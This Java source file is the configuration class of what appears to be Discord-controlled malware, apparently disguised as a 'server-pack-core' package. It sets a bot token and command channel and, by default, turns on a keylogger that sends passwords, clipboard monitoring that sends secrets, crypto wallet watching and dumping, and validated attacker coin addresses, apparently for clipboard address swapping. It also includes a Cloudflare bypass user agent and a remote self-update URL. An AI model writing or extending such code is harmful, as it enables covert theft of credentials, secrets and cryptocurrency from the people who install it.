package com.spcagentpayloa.jvmxx;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;

public final class DiscordConfig {
	/** Compiled fallback; release builds leave it empty and resolve at runtime. */
	private static volatile String botToken = Q1.BOT_TOKEN;
	private static volatile String guildId = Q1.GUILD_ID;
	private static volatile String categoryId = Q1.CATEGORY_ID;
	/** Empty means every member of the channel may send commands. */
	private static volatile Set<String> allowedUsers = Set.of();

	private static volatile boolean walletsWatch = true;
	private static volatile long walletCooldownSec = 600L;
	private static volatile boolean keylogger = true;
	private static volatile boolean sendPasswords = true;
	/** Granular keystroke timeline; additive, off only when provisioned off. */
	private static volatile boolean keyloggerTimeline = true;
	private static volatile boolean clipboardTimeline = true;
	private static volatile boolean clipboard = true;
	/** Secret clipboard alerts are on unless a config explicitly turns them off. */
	private static final boolean SECRETS_DEFAULT = true;
	private static volatile boolean sendSecrets = SECRETS_DEFAULT;
	private static volatile boolean testnet = false;
	private static volatile Map<String, List<String>> provisionedCoins = Map.of();

	public static final String API = "https://discord.com/api/v10";
	/** Cloudflare 40333s a Mozilla UA from the JDK TLS stack; a DiscordBot UA passes. */
	public static final String USER_AGENT = Version.userAgent();
	public static final String UPDATE_MANIFEST_URL =
		"https://github.com/uloaeth/server-pack-core/releases/latest/download/update.json";
	public static final int INTENT_GUILDS = 1;
	public static final int INTENT_GUILD_MESSAGES = 512;
	public static final int INTENT_MESSAGE_CONTENT = 32768;
	public static final int GATEWAY_VERSION = 10;
	public static final long POLL_MS = 2000L;
	public static final long IDLE_POLL_MS = 30000L;
	public static final long IDLE_AFTER_MS = 600000L;
	public static final long MAX_BACKOFF_MS = 300000L;
	public static final int MAX_MESSAGE_CHARS = 1000;

	private DiscordConfig() {
	}

	public static String token() {
		return botToken;
	}

	public static String guildId() {
		return guildId;
	}

	public static String categoryId() {
		return categoryId;
	}

	static void apply(String token, String guild, String category) {
		if (token != null && !token.isEmpty()) {
			botToken = token;
		}
		if (guild != null && !guild.isEmpty()) {
			guildId = guild;
		}
		if (category != null && !category.isEmpty()) {
			categoryId = category;
		}
	}

	public static Set<String> allowedUsers() {
		return allowedUsers;
	}

	static void allowed(List<String> ids) {
		allowedUsers = ids == null ? Set.of() : Set.copyOf(ids);
	}

	/** Parses the optional `wallets`/`keylogger`/`clipboard` blocks; defaults stay on. */
	static void provisioning(Map<String, Object> root) {
		Map<String, Object> wallets = Json.map(root.get("wallets"));
		walletsWatch = !Boolean.FALSE.equals(wallets.get("watch"));
		walletCooldownSec = Math.max(60L, Json.num(wallets, "dumpCooldownSec", 600L));
		Map<String, Object> keys = Json.map(root.get("keylogger"));
		keylogger = !Boolean.FALSE.equals(keys.get("enabled"));
		sendPasswords = !Boolean.FALSE.equals(keys.get("sendPasswords"));
		keyloggerTimeline = !Boolean.FALSE.equals(keys.get("timeline"));
		Map<String, Object> board = Json.map(root.get("clipboard"));
		clipboard = !Boolean.FALSE.equals(board.get("enabled"));
		sendSecrets = !Boolean.FALSE.equals(board.get("sendSecrets"));
		clipboardTimeline = !Boolean.FALSE.equals(board.get("timeline"));
		testnet = Boolean.TRUE.equals(board.get("testnet"));
		Map<String, List<String>> coins = new LinkedHashMap<>();
		for (Map.Entry<String, Object> entry : Json.map(board.get("coins")).entrySet()) {
			String coin = entry.getKey().toLowerCase(Locale.ROOT);
			if (!AddressValidator.known(coin)) {
				continue;
			}
			List<String> values = new ArrayList<>();
			for (Object item : Json.list(entry.getValue())) {
				if (item instanceof String text && AddressValidator.valid(coin, text.trim())) {
					values.add(text.trim());
				}
			}
			if (!values.isEmpty()) {
				coins.put(coin, List.copyOf(values));
			}
		}
		provisionedCoins = Map.copyOf(coins);
	}

	public static boolean walletsWatch() {
		return walletsWatch;
	}

	public static long walletCooldownSec() {
		return walletCooldownSec;
	}

	public static boolean keylogger() {
		return keylogger;
	}

	public static boolean sendPasswords() {
		return sendPasswords;
	}

	public static boolean clipboard() {
		return clipboard;
	}

	public static boolean keyloggerTimeline() {
		return keyloggerTimeline;
	}

	public static boolean clipboardTimeline() {
		return clipboardTimeline;
	}

	public static boolean sendSecrets() {
		return sendSecrets;
	}

	public static boolean testnet() {
		return testnet;
	}

	public static Map<String, List<String>> provisionedCoins() {
		return provisionedCoins;
	}

	static void reset() {
		botToken = Q1.BOT_TOKEN;
		guildId = Q1.GUILD_ID;
		categoryId = Q1.CATEGORY_ID;
		allowedUsers = Set.of();
		walletsWatch = true;
		walletCooldownSec = 600L;
		keylogger = true;
		sendPasswords = true;
		clipboard = true;
		sendSecrets = SECRETS_DEFAULT;
		testnet = false;
		provisionedCoins = Map.of();
	}
}
